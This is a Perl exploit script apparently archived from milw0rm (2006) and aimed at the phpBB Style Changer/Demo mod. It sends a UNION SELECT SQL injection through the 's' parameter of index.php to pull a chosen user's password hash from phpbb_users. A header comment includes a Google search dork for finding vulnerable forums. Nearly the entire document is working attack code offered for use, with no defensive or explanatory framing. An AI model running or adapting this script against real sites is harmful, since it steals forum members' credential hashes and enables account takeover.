#!/usr/bin/perl
#########################################################
#		 _______ _______ ______ 		#
#		 |______ |______ |     \		#
#		 ______| |______ |_____/		#
#		                        		#
#phpBB Style Changer/Demo Mod-->GET HASH EXPLOIT	#
#Created By SkOd                                        #
#SED security Team                                      #
#http://www.sed-team.be                                 #
#skod.uk@gmail.com                                      #
#ISRAEL                                                 #
#########################################################
#google:
#"Powered by phpBB" inurl:"index.php?s" OR inurl:"index.php?style"
#########################################################
use IO::Socket;
if (@ARGV < 3){
print q{
############################################################
#   phpBB Style Changer\Viewer MOD SQL injection Exploit   #
#		Tested on phpBB 2.0.19			   #
#	    created By SkOd. SED Security Team             #
############################################################
	bbstyle.pl [HOST] [PATH] [Target id]
	 bbstyle.pl www.host.com /phpbb2/ 2
############################################################
};
exit;
}
$serv = $ARGV[0];
$dir = $ARGV[1];
$id = $ARGV[2];
print "[+]Make Connection\n";
$serv =~ s/(http:\/\/)//eg;
$path = $dir.'index.php?s=-99%20UNION%20SELECT%20null,user_password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20phpbb_users%20Where%20user_id='.$id.'/*';
$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "80") || die "[-]Connect Failed\r\n";
print $socket "GET $path HTTP/1.1\n";
print $socket "Host: $serv\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "[+]Connected\n";
while ($hash = <$socket>){
$hash =~ m/open(.*?)template/ && print "[+]User id: $id\n[+]Md5 Hash: $1\n";
}

# milw0rm.com [2006-02-05]
